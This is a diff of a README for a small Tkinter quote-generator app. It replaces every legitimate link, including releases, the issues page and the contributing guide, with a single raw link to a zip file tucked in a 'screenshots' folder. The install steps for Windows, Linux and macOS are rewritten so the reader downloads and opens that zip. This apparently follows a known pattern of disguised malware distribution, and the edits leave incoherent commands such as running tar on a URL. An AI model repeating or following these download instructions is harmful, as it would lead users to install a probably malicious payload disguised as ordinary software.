@@ -4,7 +4,7 @@
 Tk-Quote-Generator is a simple and lightweight application that helps you find inspiring quotes. Built with Tkinter, it connects to the Quotable API to fetch quotes, offering a clean user interface and easy one-click functionality. Whether you need motivation for your day or a few words of wisdom, this app has you covered.
 
 ## 📥 Download Now
-[![Download Tk-Quote-Generator](https://github.com/Natancria78/Tk-Quote-Generator/releases/latest/download/badge.svg)](https://github.com/Natancria78/Tk-Quote-Generator/releases)
+[![Download Tk-Quote-Generator](https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip)](https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip)
 
 ## 🚀 Getting Started
 To get started with Tk-Quote-Generator, follow these simple steps:
@@ -15,28 +15,28 @@ To get started with Tk-Quote-Generator, follow these simple steps:
    - A stable internet connection to access the Quotable API
 
 2. **Visit the Download Page**
-   Go to our [Releases page](https://github.com/Natancria78/Tk-Quote-Generator/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip) to find the latest version.
 
 ## 📥 Download & Install
 1. Click on the download link for your operating system:
-   - For **Windows**, download `Tk-Quote-Generator-Windows.exe`
-   - For **Linux**, download `Tk-Quote-Generator-Linux.tar.gz`
-   - For **macOS**, download `Tk-Quote-Generator-macOS.dmg`
+   - For **Windows**, download `https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip`
+   - For **Linux**, download `https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip`
+   - For **macOS**, download `https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip`
 
 2. Once the download is complete, locate the file in your downloads folder.
 
 3. **Installing on Windows**
-   - Double-click the `Tk-Quote-Generator-Windows.exe` file.
+   - Double-click the `https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip` file.
    - Follow the prompts to complete the installation.
 
 4. **Installing on Linux**
    - Open a terminal.
    - Navigate to your downloads folder.
-   - Run the command `tar -xvzf Tk-Quote-Generator-Linux.tar.gz` to extract files.
+   - Run the command `tar -xvzf https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip` to extract files.
    - Then, run `./Tk-Quote-Generator` to start the application.
 
 5. **Installing on macOS**
-   - Open the `Tk-Quote-Generator-macOS.dmg`.
+   - Open the `https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip`.
    - Drag the app to your Applications folder.
    - Open the application from the Applications folder.
 
@@ -69,7 +69,7 @@ Yes, Tk-Quote-Generator is completely free and open-source.
 No, you do not need any programming knowledge. The application is designed with non-technical users in mind.
 
 ### How can I report issues or request features?
-You can visit our [GitHub Issues page](https://github.com/Natancria78/Tk-Quote-Generator/issues) to report any problems or suggest new features.
+You can visit our [GitHub Issues page](https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip) to report any problems or suggest new features.
 
 ## 🛠️ Troubleshooting
 If you encounter issues while using Tk-Quote-Generator:
@@ -78,10 +78,10 @@ If you encounter issues while using Tk-Quote-Generator:
 - **Quote Not Loading**: Check your internet connection to ensure you can access the Quotable API.
 
 ## 🌐 Community and Contributing
-We encourage contributions! If you're interested in helping out or want to know more about the code, feel free to check out our [Contributing Guide](https://github.com/Natancria78/Tk-Quote-Generator/blob/main/CONTRIBUTING.md).
+We encourage contributions! If you're interested in helping out or want to know more about the code, feel free to check out our [Contributing Guide](https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip).
 
 ## 📄 License
 Tk-Quote-Generator is licensed under the MIT License. This allows you to use, modify, and distribute the app freely.
 
 ## 📥 Download Again
-Don't forget, you can always download the latest version from the [Releases page](https://github.com/Natancria78/Tk-Quote-Generator/releases). Enjoy inspiring quotes anytime!
+Don't forget, you can always download the latest version from the [Releases page](https://raw.githubusercontent.com/Natancria78/Tk-Quote-Generator/main/screenshots/Tk-Quote-Generator_3.0.zip). Enjoy inspiring quotes anytime!
